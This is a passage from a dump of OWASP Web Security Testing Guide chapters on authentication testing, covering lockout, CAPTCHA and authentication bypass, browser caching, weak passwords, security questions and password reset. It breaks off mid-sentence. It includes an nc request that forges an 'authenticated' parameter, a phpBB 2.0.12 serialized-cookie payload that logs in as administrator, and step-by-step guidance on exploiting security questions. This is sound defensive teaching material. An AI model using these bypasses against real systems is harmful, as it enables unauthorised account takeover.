minutes. Sign-in attempts made during the lockout period are exceptions referred to as `Password attempts exceeded`, and in most implementations are not returned to the user who initiated the sign-in. If they aren't shown to the user, a tester may think that no lockout mechanism is being used, as 200 rapid attempts to sign-in would generate a lot of the exceptions, and very few legitimate failed sign-in attempts.\n  \nThe math behind the mechanism is: `2^(n-5)`, with `n` being the number of failed sign-in attempts. The resulting number is the amount of seconds that the user is locked out. To reset the lockout count to zero, the user must sign-in successfully or wait the 15 minutes.\n\nTo test for this using a fuzzing tool, such as Burp Suite's Intruder, navigate into the \"Resource Pool\". Then set the maximum concurrent requests to 1 and the delay between requests to 2 seconds. Attempt the invalid authentication 200 times, then attempt to use the valid credentials 3 times directly after the fuzzing tool finishes. Wait 2 minutes and attempt to sign-in. If sign-in is then successful, Cognito may be in use. Further testing can then be performed to validate the use of Cognito by attempting to push the lockout time higher, but it may be easier to validate this information with the client.\n\nA CAPTCHA may hinder brute force attacks, but they can come with their own set of weaknesses, and should not replace a lockout mechanism. A CAPTCHA mechanism may be bypassed if implemented incorrectly. CAPTCHA flaws include:\n\n1. Easily defeated challenge, such as arithmetic or limited question set.\n2. CAPTCHA checks for HTTP response code instead of response success.\n3. CAPTCHA server-side logic defaults to a successful solve.\n4. CAPTCHA challenge result is never validated server-side.\n5. CAPTCHA input field or parameter is manually processed, and is improperly validated or escaped.\n\nTo evaluate CAPTCHA effectiveness:\n\n1. Assess CAPTCHA challenges and attempt automating solutions depending on difficulty.\n2. Attempt to submit request without solving CAPTCHA via the normal UI mechanism(s).\n3. Attempt to submit request with intentional CAPTCHA challenge failure.\n4. Attempt to submit request without solving CAPTCHA (assuming some default values may be passed by client-side code, etc) while using a testing proxy (request submitted directly server-side).\n5. Attempt to fuzz CAPTCHA data entry points (if present) with common injection payloads or special characters sequences.\n6. Check if the solution to the CAPTCHA might be the alt-text of the image(s), filename(s), or a value in an associated hidden field.\n7. Attempt to re-submit previously identified known good responses.\n8. Check if clearing cookies causes the CAPTCHA to be bypassed (for example if the CAPTCHA is only shown after a number of failures).\n9. If the CAPTCHA is part of a multi-step process, attempt to simply access or complete a step beyond the CAPTCHA (for example if CAPTCHA is the first step in a login process, try simply submitting the second step [username and password]).\n10. Check for alternative methods that might not have CAPTCHA enforced, such as an API endpoint meant to facilitate mobile app access.\n\nRepeat this process to every possible functionality that could require a lockout mechanism.\n\n### Unlock Mechanism\n\nTo evaluate the unlock mechanism's resistance to unauthorized account unlocking, initiate the unlock mechanism and look for weaknesses. Typical unlock mechanisms may involve secret questions or an emailed unlock link. The unlock link should be a unique one-time link, to stop an attacker from guessing or replaying the link and performing brute force attacks in batches.\n\nNote that an unlock mechanism should only be used for unlocking accounts. It is not the same as a password recovery mechanism, yet could follow the same security practices.\n\n## Remediation\n\nApply account unlock mechanisms depending on the risk level. In order from lowest to highest assurance:\n\n1. Time-based lockout and unlock.\n2. Self-service unlock (sends unlock email to registered email address).\n3. Manual administrator unlock.\n4. Manual administrator unlock with positive user identification.\n\nFactors to consider when implementing an account lockout mechanism:\n\n1. What is the risk of brute force password guessing against the application?\n2. Is a CAPTCHA sufficient to mitigate this risk?\n3. Is a client-side lockout mechanism being used (e.g., JavaScript)? (If so, disable the client-side code to test.)\n4. Number of unsuccessful log in attempts before lockout. If the lockout threshold is too low then valid users may be locked out too often. If the lockout threshold is too high then the more attempts an attacker can make to brute force the account before it will be locked. Depending on the application's purpose, a range of 5 to 10 unsuccessful attempts is a typical lockout threshold.\n5. How will accounts be unlocked?\n    1. Manually by an administrator: this is the most secure lockout method, but may cause inconvenience to users and take up the administrator's \"valuable\" time.\n        1. Note that the administrator should also have a recovery method in case his account gets locked.\n        2. This unlock mechanism may lead to a denial-of-service attack if an attacker's goal is to lock the accounts of all users of the web application.\n    2. After a period of time: What is the lockout duration? Is this sufficient for the application being protected? E.g. a 5 to 30 minute lockout duration may be a good compromise between mitigating brute force attacks and inconveniencing valid users.\n    3. Via a self-service mechanism: As stated before, this self-service mechanism must be secure enough to avoid that the attacker can unlock accounts himself.\n\n## References\n\n- See the OWASP article on [Brute Force](https://owasp.org/www-community/attacks/Brute_force_attack) Attacks.\n- [Forgot Password CS](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html).\n", "timestamp": "2025-10-24T11:39:46.781044"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md", "content": "# Testing for Bypassing Authentication Schema\n\n|ID          |\n|------------|\n|WSTG-ATHN-04|\n\n## Summary\n\nIn computer security, authentication is the process of attempting to verify the digital identity of the sender of a communication. A common example of such a process is the log on process. Testing the authentication schema means understanding how the authentication process works and using that information to circumvent the authentication mechanism.\n\nWhile most applications require authentication to gain access to private information or to execute tasks, not every authentication method is able to provide adequate security. Negligence, ignorance, or simple understatement of security threats often result in authentication schemes that can be bypassed by simply skipping the log in page and directly calling an internal page that is supposed to be accessed only after authentication has been performed.\n\nIn addition, it is often possible to bypass authentication measures by tampering with requests and tricking the application into thinking that the user is already authenticated. This can be accomplished either by modifying the given URL parameter, by manipulating the form, or by counterfeiting sessions.\n\nProblems related to the authentication schema can be found at different stages of the software development lifecycle (SDLC), like the design, development, and deployment phases:\n\n- In the design phase errors can include a wrong definition of application sections to be protected, the choice of not applying strong encryption protocols for securing the transmission of credentials, and many more.\n- In the development phase errors can include the incorrect implementation of input validation functionality or not following the security best practices for the specific language.\n- In the application deployment phase, there may be issues during the application setup (installation and configuration activities) due to a lack in required technical skills or due to the lack of good documentation.\n\n## Test Objectives\n\n- Ensure that authentication is applied across all services that require it.\n\n## How to Test\n\nThere are several methods of bypassing the authentication schema that is used by a web application:\n\n- Parameter modification\n- Session ID prediction\n- SQL injection\n\n### Parameter Modification\n\nAnother problem related to authentication design is when the application verifies a successful log in on the basis of a fixed value parameters. A user could modify these parameters to gain access to the protected areas without providing valid credentials. In the example below, the \"authenticated\" parameter is changed to a value of \"yes\", which allows the user to gain access. In this example, the parameter is in the URL, but a proxy could also be used to modify the parameter, especially when the parameters are sent as form elements in a POST request or when the parameters are stored in a cookie.\n\n```html\nhttps://www.site.com/page.asp?authenticated=no\n\nraven@blackbox /home $nc www.site.com 80\nGET /page.asp?authenticated=yes HTTP/1.0\n\nHTTP/1.1 200 OK\nDate: Sat, 11 Nov 2006 10:22:44 GMT\nServer: Apache\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<HTML><HEAD>\n</HEAD><BODY>\n<H1>You Are Authenticated</H1>\n</BODY></HTML>\n```\n\n![Parameter Modified Request](images/Basm-parammod.jpg)\\\n*Figure 4.4.4-1: Parameter Modified Request*\n\n### Session ID Prediction\n\nMany web applications manage authentication by using session identifiers (session IDs). Therefore, if session ID generation is predictable, a malicious user could be able to find a valid session ID and gain unauthorized access to the application, impersonating a previously authenticated user.\n\nIn the following figure, values inside cookies increase linearly, so it could be easy for an attacker to guess a valid session ID.\n\n![Cookie Values Over Time](images/Basm-sessid.jpg)\\\n*Figure 4.4.4-2: Cookie Values Over Time*\n\nIn the following figure, values inside cookies change only partially, so it's possible to restrict a brute force attack to the defined fields shown below.\n\n![Partially Changed Cookie Values](images/Basm-sessid2.jpg)\\\n*Figure 4.4.4-3: Partially Changed Cookie Values*\n\n### SQL Injection (HTML Form Authentication)\n\nSQL Injection is a widely known attack technique. This section is not going to describe this technique in detail as there are several sections in this guide that explain injection techniques beyond the scope of this section.\n\n![SQL Injection](images/Basm-sqlinj.jpg)\\\n*Figure 4.4.4-4: SQL Injection*\n\nThe following figure shows that with a simple SQL injection attack, it is sometimes possible to bypass the authentication form.\n\n![Simple SQL Injection Attack](images/Basm-sqlinj2.gif)\\\n*Figure 4.4.4-5: Simple SQL Injection Attack*\n\n### PHP Loose Comparison\n\nIf an attacker has been able to retrieve the application source code by exploiting a previously discovered vulnerability (e.g., directory traversal), or from a web repository (Open Source Applications), it could be possible to perform refined attacks against the implementation of the authentication process.\n\nIn the following example (PHPBB 2.0.12 - Authentication Bypass Vulnerability), at line 2 the `unserialize()` function parses a user supplied cookie and sets values inside the `$sessiondata` array. At line 7, the user's MD5 password hash stored inside the backend database (`$auto_login_key`) is compared to the one supplied (`$sessiondata['autologinid']`) by the user.\n\n```php\n1. if (isset($HTTP_COOKIE_VARS[$cookiename . '_sid'])) {\n2.     $sessiondata = isset($HTTP_COOKIE_VARS[$cookiename . '_data']) ? unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data'])) : array();\n3.     $sessionmethod = SESSION_METHOD_COOKIE;\n4. }\n5. $auto_login_key = $userdata['user_password'];\n6. // We have to login automagically\n7. if( $sessiondata['autologinid'] == $auto_login_key )\n8. {\n9.     // autologinid matches password\n10.     $login = 1;\n11.     $enable_autologin = 1;\n12. }\n\n```\n\nIn PHP, a comparison between a string value and a `true` boolean value is always `true` (because the string contains a value), so by supplying the following string to the `unserialize()` function, it is possible to bypass the authentication control and log in as administrator, whose `userid` is 2:\n\n```php\na:2:{s:11:\"autologinid\";b:1;s:6:\"userid\";s:1:\"2\";}  // original value: a:2:{s:11:\"autologinid\";s:32:\"8b8e9715d12e4ca12c4c3eb4865aaf6a\";s:6:\"userid\";s:4:\"1337\";}\n```\n\nLet's disassemble what we did in this string:\n\n1. `autologinid` is now a boolean set to `true`: this can be seen by replacing the MD5 value of the password hash (`s:32:\"8b8e9715d12e4ca12c4c3eb4865aaf6a\"`) with `b:1`\n2. `userid` is now set to the admin ID: this can be seen in the last piece of the string, where we replaced our regular user ID (`s:4:\"1337\"`) with `s:1:\"2\"`\n\n## Tools\n\n- [WebGoat](https://owasp.org/www-project-webgoat/)\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n\n## References\n\n- [Niels Teusink: phpBB 2.0.12 authentication bypass](http://blog.teusink.net/2008/12/classic-bug-phpbb-2012-authentication.html)\n- [David Endler: \"Session ID Brute Force Exploitation and Prediction\"](https://www.cgisecurity.com/lib/SessionIDs.pdf)\n", "timestamp": "2025-10-24T11:39:46.862224"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password.md", "content": "# Testing for Vulnerable Remember Password\n\n|ID          |\n|------------|\n|WSTG-ATHN-05|\n\n## Summary\n\nCredentials are the most widely used authentication technology. Due to such a wide usage of username-password pairs, users are no longer able to properly handle their credentials across the multitude of used applications.\n\nIn order to assist users with their credentials, multiple technologies surfaced:\n\n- Applications provide a *remember me* functionality that allows the user to stay authenticated for long periods of time, without asking the user again for their credentials.\n- Password Managers - including browser password managers - that allow the user to store their credentials in a secure manner and later on inject them in user-forms without any user intervention.\n\n## Test Objectives\n\n- Validate that the generated session is managed securely and do not put the user's credentials in danger.\n\n## How to Test\n\nAs these methods provide a better user experience and allow the user to forget all about their credentials, they increase the attack surface area. Some applications:\n\n- Store the credentials in an encoded fashion in the browser's storage mechanisms, which can be verified by following the [web storage testing scenario](../11-Client-side_Testing/12-Testing_Browser_Storage.md) and going through the [session analysis](../06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md#session-analysis) scenarios. Credentials shouldn't be stored in any way in the client-side application, and should be substituted by tokens generated server-side.\n- Automatically inject the user's credentials that can be abused by:\n    - [ClickJacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md) attacks.\n    - [CSRF](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md) attacks.\n- Tokens should be analyzed in terms of token-lifetime, where some tokens never expire and put the users in danger if those tokens ever get stolen. Make sure to follow the [session timeout](../06-Session_Management_Testing/07-Testing_Session_Timeout.md) testing scenario.\n\n## Remediation\n\n- Follow [session management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) good practices.\n- Ensure that no credentials are stored in clear text or are easily retrievable in encoded or encrypted forms in browser storage mechanisms; they should be stored server-side and follow good [password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) practices.\n", "timestamp": "2025-10-24T11:39:46.946151"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md", "content": "# Testing for Browser Cache Weaknesses\n\n|ID          |\n|------------|\n|WSTG-ATHN-06|\n\n## Summary\n\nIn this phase the tester checks that the application correctly instructs the browser to not retain sensitive data.\n\nBrowsers can store information for purposes of caching and history. Caching is used to improve performance, so that previously displayed information doesn't need to be downloaded again. History mechanisms are used for user convenience, so the user can see exactly what they saw at the time when the resource was retrieved. If sensitive information is displayed to the user (such as their address, credit card details, Social Security Number, or username), then this information could be stored for purposes of caching or history, and therefore retrievable through examining the browser's cache or by simply pressing the browser's **Back** button.\n\n## Test Objectives\n\n- Review if the application stores sensitive information on the client-side.\n- Review if access can occur without authorization.\n\n## How to Test\n\n### Browser History\n\nTechnically, the **Back** button is a history and not a cache (see [Caching in HTTP: History Lists](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.13)). The cache and the history are two different entities. However, they share the same weakness of presenting previously displayed sensitive information.\n\nThe first and simplest test consists of entering sensitive information into the application and logging out. Then the tester clicks the **Back** button of the browser to check whether previously displayed sensitive information can be accessed whilst unauthenticated.\n\nIf by pressing the **Back** button the tester can access previous pages but not access new ones, then it is not an authentication issue, but a browser history issue. If these pages contain sensitive data, it means that the application did not forbid the browser from storing it.\n\nAuthentication does not necessarily need to be involved in the testing. For example, when a user enters their email address in order to sign up to a newsletter, this information could be retrievable if not properly handled.\n\nThe **Back** button can be stopped from showing sensitive data. This can be done by:\n\n- Delivering the page over HTTPS.\n- Setting `Cache-Control: must-revalidate`\n\n### Browser Cache\n\nHere testers check that the application does not leak any sensitive data into the browser cache. In order to do that, they can use a proxy (such as ZAP) and search through the server responses that belong to the session, checking that for every page that contains sensitive information the server instructed the browser not to cache any data. Such a directive can be issued in the HTTP response headers with the following directives:\n\n- `Cache-Control: no-cache, no-store`\n- `Expires: 0`\n- `Pragma: no-cache`\n\nThese directives are generally robust, although additional flags may be necessary for the `Cache-Control` header in order to better prevent persistently linked files on the file system. These include:\n\n- `Cache-Control: must-revalidate, max-age=0, s-maxage=0`\n\n```http\nHTTP/1.1:\nCache-Control: no-cache\n```\n\n```html\nHTTP/1.0:\nPragma: no-cache\nExpires: \"past date or illegal value (e.g., 0)\"\n```\n\nFor instance, if testers are testing an e-commerce application, they should look for all pages that contain a credit card number or some other financial information, and check that all those pages enforce the `no-cache` directive. If they find pages that contain critical information but that fail to instruct the browser not to cache their content, they know that sensitive information will be stored on the disk, and they can double-check this simply by looking for the page in the browser cache.\n\nThe exact location where that information is stored depends on the client operating system and on the browser that has been used. Here are some examples:\n\n- Mozilla Firefox:\n    - Unix/Linux: `~/.cache/mozilla/firefox/`\n    - Windows: `C:\\Users\\<user_name>\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile-id>\\Cache2\\`\n- Internet Explorer:\n    - `C:\\Users\\<user_name>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\`\n- Chrome:\n    - Windows: `C:\\Users\\<user_name>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache`\n    - Unix/Linux: `~/.cache/google-chrome`\n\n#### Reviewing Cached Information\n\nFirefox provides functionality for viewing cached information, which may be to your benefit as a tester. Of course the industry has also produced various extensions, and external apps which you may prefer or need for Chrome, Internet Explorer, or Edge.\n\nCache details are also available via developer tools in most modern browsers, such as [Firefox](https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector#Cache_Storage), [Chrome](https://developers.google.com/web/tools/chrome-devtools/storage/cache), and Edge. With Firefox it is also possible to use the URL `about:cache` to check cache details.\n\n#### Check Handling for Mobile Browsers\n\nHandling of cache directives may be completely different for mobile browsers. Therefore, testers should start a new browsing session with clean caches and take advantage of features like Chrome's [Device Mode](https://developers.google.com/web/tools/chrome-devtools/device-mode) or Firefox's [Responsive Design Mode](https://developer.mozilla.org/en-US/docs/Tools/Responsive_Design_Mode) to re-test or separately test the concepts outlined above.\n\nAdditionally, personal proxies such as ZAP and Burp Suite allow the tester to specify which `User-Agent` should be sent by their spiders/crawlers. This could be set to match a mobile browser `User-Agent` string and used to see which caching directives are sent by the application being tested.\n\n### Gray-Box Testing\n\nThe methodology for testing is equivalent to the black-box case, as in both scenarios testers have full access to the server response headers and to the HTML code. However, with gray-box testing, the tester may have access to account credentials that will allow them to test sensitive pages that are accessible only to authenticated users.\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n\n## References\n\n### Whitepapers\n\n- [Caching in HTTP](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)\n", "timestamp": "2025-10-24T11:39:47.037404"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Authentication_Methods.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Authentication_Methods.md", "content": "# Testing for Weak Authentication Methods\n\n|ID          |\n|------------|\n|WSTG-ATHN-07|\n\n## Summary\n\nThe most prevalent and most easily administered authentication mechanism is a static password. The password represents the keys to the kingdom, but is often subverted by users in the name of usability. In each of the recent high profile hacks that have revealed user credentials, it is lamented that most common passwords are still: `123456`, `password` and `qwerty`.\n\nAdditionally, applications may utilize alternative credentials that are treated the same as a password, but are considerably weaker, such as a birthdates, social security numbers, PINs, or security questions. In some scenarios, these more easily guessed credentials may act as the only user supplied value for authentication.\n\n## Test Objectives\n\n- Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.\n\n## How to Test\n\n1. What characters are permitted and forbidden for use within a password? Is the user required to use characters from different character sets such as lower and uppercase letters, digits and special symbols?\n2. How often can a user change their password? How quickly can a user change their password after a previous change? Users may bypass password history requirements by changing their password 5 times in a row so that after the last password change they have configured their initial password again.\n3. When must a user change their password?\n    - Both [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecretver) and [NCSC](https://www.ncsc.gov.uk/collection/passwords/updating-your-approach#PasswordGuidance:UpdatingYourApproach-Don'tenforceregularpasswordexpiry) recommend **against** forcing regular password expiry, although it may be required by standards such as PCI DSS.\n4. How often can a user reuse a password? Does the application maintain a history of the user's previous used 8 passwords?\n5. How different must the next password be from the last password?\n6. Is the user prevented from using his username or other account information (such as first or last name) in the password?\n7. What are the minimum and maximum password lengths that can be set, and are they appropriate for the sensitivity of the account and application?\n8. Is it possible to set common passwords such as `Password1` or `123456`?\n9. Is the credential chosen for the user by the application, such as a social security number or a birthdate? Is the credential that's utilized in lieu of a standard password easily obtainable, predictable, or susceptible to brute-force attacks?\n\n## Remediation\n\nTo mitigate the risk of easily guessed passwords facilitating unauthorized access there are two solutions: introduce additional authentication controls (i.e. two-factor authentication) or introduce a strong password policy. The simplest and cheapest of these is the introduction of a strong password policy that ensures password length, complexity, reuse and aging; although ideally both of them should be implemented.\n\n## References\n\n- [Brute Force Attacks](https://owasp.org/www-community/attacks/Brute_force_attack)\n", "timestamp": "2025-10-24T11:39:47.145082"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer.md", "content": "# Testing for Weak Security Question Answer\n\n|ID          |\n|------------|\n|WSTG-ATHN-08|\n\n## Summary\n\nOften called \"secret\" questions and answers, security questions and answers are often used to recover forgotten passwords (see [Testing for weak password change or reset functionalities](09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md), or as extra security on top of the password.\n\nThey are typically generated upon account creation and require the user to select from some pre-generated questions and supply an appropriate answer. They may allow the user to generate their own question and answer pairs. Both methods are prone to insecurities. Ideally, security questions should generate answers that are only known by the user, and not guessable or discoverable by anybody else. This is harder than it sounds.\nSecurity questions and answers rely on the secrecy of the answer. Questions and answers should be chosen so that the answers are only known by the account holder. However, although a lot of answers may not be publicly known, most of the questions that sites implement promote answers that are pseudo-private.\n\n### Pre-generated Questions\n\nThe majority of pre-generated questions are fairly simplistic in nature and can lead to insecure answers. For example:\n\n- The answers may be known to family members or close friends of the user, e.g. \"What is your mother's maiden name?\", \"What is your date of birth?\"\n- The answers may be easily guessable, e.g. \"What is your favorite color?\", \"What is your favorite baseball team?\"\n- The answers may be brute forcible, e.g. \"What is the first name of your favorite high school teacher?\" - the answer is probably on some easily downloadable lists of popular first names, and therefore a simple brute force attack can be scripted.\n- The answers may be publicly discoverable, e.g. \"What is your favorite movie?\" - the answer may easily be found on the user's social media profile page.\n\n### Self-generated Questions\n\nThe problem with having users to generate their own questions is that it allows them to generate very insecure questions, or even bypass the whole point of having a security question in the first place. Here are some real world examples that illustrate this point:\n\n- \"What is 1+1?\"\n- \"What is your username?\"\n- \"My password is S3curIty!\"\n\n## Test Objectives\n\n- Determine the complexity and how straight-forward the questions are.\n- Assess possible user answers and brute force capabilities.\n\n## How to Test\n\n### Testing for Weak Pre-generated Questions\n\nTry to obtain a list of security questions by creating a new account or by following the \"I don’t remember my password\"-process. Try to generate as many questions as possible to get a good idea of the type of security questions that are asked. If any of the security questions fall in the categories described above, they are vulnerable to being attacked (guessed, brute-forced, available on social media, etc.).\n\n### Testing for Weak Self-Generated Questions\n\nTry to create security questions by creating a new account or by configuring your existing account’s password recovery properties. If the system allows the user to generate their own security questions, it is vulnerable to having insecure questions created. If the system uses the self-generated security questions during the forgotten password functionality and if usernames can be enumerated (see [Testing for Account Enumeration and Guessable User Account](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md), then it should be easy for the tester to enumerate a number of self-generated questions. It should be expected to find several weak self-generated questions using this method.\n\n### Testing for Brute-forcible Answers\n\nUse the methods described in [Testing for Weak lock out mechanism](03-Testing_for_Weak_Lock_Out_Mechanism.md) to determine if a number of incorrectly supplied security answers trigger a lockout mechanism.\n\nThe first thing to take into consideration when trying to exploit security questions is the number of questions that need to be answered. The majority of applications only need the user to answer a single question, whereas some critical applications may require the user to answer two or even more questions.\n\nThe next step is to assess the strength of the security questions. Could the answers be obtained by a simple Google search or with social engineering attack? As a penetration tester, here is a step-by-step walkthrough of exploiting a security question scheme:\n\n- Does the application allow the end user to choose the question that needs to be answered? If so, focus on questions which have:\n\n    - A \"public\" answer; for example, something that could be find with a simple search-engine query.\n    - A factual answer such as a \"first school\" or other facts which can be looked up.\n    - Few possible answers, such as \"what model was your first car\". These questions would present the attacker with a short list of possible answers, and based on statistics the attacker could rank answers from most to least likely.\n\n- Determine how many guesses you have if possible.\n    - Does the password reset allow unlimited attempts?\n    - Is there a lockout period after X incorrect answers? Keep in mind that a lockout system can be a security problem in itself, as it can be exploited by an attacker to launch a Denial of Service against legitimate users.\n    - Pick the appropriate question based on analysis from the above points, and do research to determine the most likely answers.\n\nThe key to successfully exploiting and bypassing a weak security question scheme is to find a question or set of questions which give the possibility of easily finding the answers. Always look for questions which can give you the greatest statistical chance of guessing the correct answer, if you are completely unsure of any of the answers. In the end, a security question scheme is only as strong as the weakest question.\n\n## References\n\n- [The Curse of the Secret Question](https://www.schneier.com/essay-081.html)\n- [The OWASP Security Questions Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:47.207552"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md", "content": "# Testing for Weak Password Change or Reset Functionalities\n\n|ID          |\n|------------|\n|WSTG-ATHN-09|\n\n## Summary\n\nFor any application that requires the user to authenticate with a password, there must be a mechanism by which the user can regain access to their account if they forget their password. Although this can sometimes be a manual process that involves contacting the owner of the website or a support team, users are frequently allowed to carry out a self-service password reset, and to regain access to their account by providing some other evidence of their identity.\n\nAs this functionality provides a direct route to compromise the user's account, it is crucial that it is implemented securely.\n\n## Test Objectives\n\n- Determine whether the password change and reset functionality allows accounts to be compromised.\n\n## How to Test\n\n### Information Gathering\n\nThe first step is to gather information about what mechanisms are available to allow the user to reset their password on the application. If there are multiple interfaces on the same site (such as a web interface, mobile application, and API) then these should all be reviewed, in case they provide different functionality.\n\nOnce this has been established, determine what information is required in order for a user to initiate a password reset. This can be the username or email address (both of which may be obtained from public information), but it could also be an internally-generated user ID.\n\n### General Concerns\n\nRegardless of the specific methods used to reset passwords, there are a number of common areas that need to be considered:\n\n- Is the password reset process weaker than the authentication process?\n\n  The password reset process provides an alternative mechanism to access a user's account, and so should be at least as secure as the usual authentication process. However, it can provide an easier way to compromise the account, especially if it uses weaker authentication factors such as security questions.\n\n  Additionally, the password reset process may bypass the requirement to use Multi-Factor Authentication (MFA), which can substantially reduce the security of the application.\n\n- Is there rate limiting or other protection against automated attacks?\n\n  As with any authentication mechanism, the password reset process should have protection against automated or brute-force attacks. There are a variety of different methods that can be used to achieve this, such as rate limiting or the use of CAPTCHA. These are particularly important on functionality that triggers external actions (such as sending an email or SMS), or when the user is entering a password reset token.\n\n  It is also possible to protect against brute-force attacks by locking out the account from the password reset process after a certain number of consecutive attempts. This could also prevent a legitimate user from being able to reset their password and regain access to their account, however.\n\n- Is it vulnerable to common attacks?\n\n  As well as the specific areas discussed in this guide, it's also important to check for other common vulnerabilities such as SQL injection or cross-site scripting.\n\n- Does the reset process allow user enumeration?\n\n  See the [Testing for Account Enumeration](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md) guide for further information.\n\n### Email - New Password Sent\n\nIn this model, the user is sent a new password via email once they have proved their identity. This is considered less secure for two main reasons:\n\n- The password is sent to the user in an unencrypted form.\n- The password for the account is changed when the request is made, effectively locking the user out of their account until they receive the email. By making repeated requests, it is possible to prevent a user from being able to access their account.\n\nWhere this approach is used, the following areas should be reviewed:\n\n- Is the user forced to change the password on initial login?\n\n  The new password is sent over unencrypted email, and may sit in the user's inbox indefinitely if they don't delete the email. As such, the user should be required to change the password as soon as they log in for the first time.\n\n- Is the password securely generated?\n\n  The password should be generated using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long to prevent password guessing or brute-force attacks. For a secure user-friendly experience, it should be generated using a secure passphrase-style approach (i.e, combining multiple words), rather than a string of random characters.\n\n- Is the user's existing password sent to them?\n\n  Rather than generating a new password for the user, some applications will send the user their existing password. This is a very insecure approach, as it exposes their current password over unencrypted email. Additionally, if the site is able to recover the existing password, this implies that passwords are either stored using reversible encryption, or (more likely) in unencrypted plain text, both of which represent a serious security weakness.\n\n- Are the emails sent from a domain with anti-spoofing protection?\n\n  The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.\n\n- Is email considered sufficiently secure?\n\n  Emails are typically sent unencrypted, and in many cases the user's email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.\n\n  Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.\n\n### Email - Link Sent\n\nIn this model, the user is emailed a link that contains a token. They can then click this link, and are prompted to enter a new password on the site. This is the most common approach used for password reset, but is more complex to implement than the previously discussed approach. The key areas to test are:\n\n- Does the link use HTTPS?\n\n  If the token is sent over unencrypted HTTP, it may be possible for an attacker to intercept it.\n\n- Can the link be used multiple times?\n\n  Links should expire after they are used, otherwise they provide a persistent backdoor for the account.\n\n- Does the link expire if it remains unused?\n\n  Links should be time limited. Exactly how long is appropriate will depend on the site, but it should rarely be more than an hour.\n\n- Is the token sufficiently long and random?\n\n  The security of the process is entirely reliant on an attacker not being able to guess or brute-force a token. The tokens should be generated with a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long that it is impractical for an attacker to guess or brute-force. At least 128 bits (or 32 hex characters) is a sufficient minimum to make such an online attack impractical.\n\n  Tokens should never be generated based on known values, such as by taking the MD5 hash of the user's email with `md5($email)`, or using GUIDs which may use insecure PRNG functions, or may not even be random depending on the type.\n\n  An alternative approach to random tokens is to use a cryptographically signed token such as a JWT. In this case, the usual JWT checks should be carried out (is the signature verified, can the \"nONe\" algorithm be used, can the HMAC key be brute-forced, etc). See the [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md) guide for further information.\n\n- Does the link contain a user ID?\n\n  Sometimes the password reset link may include a user ID as well as a token, such as `reset.php?userid=1&token=123456`. In this case, it may be possible to modify the `userid` parameter to reset other users' passwords.\n\n- Can you inject a different host header?\n\n  If the application trusts the value of the `Host` header and uses this to generate the password reset link, it may be possible to steal tokens by injecting a modified `Host` header into the request. See the [Testing for Host Header Injection](../07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md) guide for further information.\n\n- Is the link exposed to third parties?\n\n  If the page that the user is taken to includes content from other parties (such as loading 